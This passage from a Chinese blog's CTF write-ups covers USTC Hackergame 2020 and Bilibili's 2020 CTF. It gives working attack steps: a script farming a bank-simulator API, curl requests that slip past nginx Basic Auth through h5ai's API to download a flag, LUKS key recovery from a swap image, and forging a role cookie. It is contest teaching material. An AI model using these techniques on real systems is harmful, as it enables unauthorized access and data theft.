块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 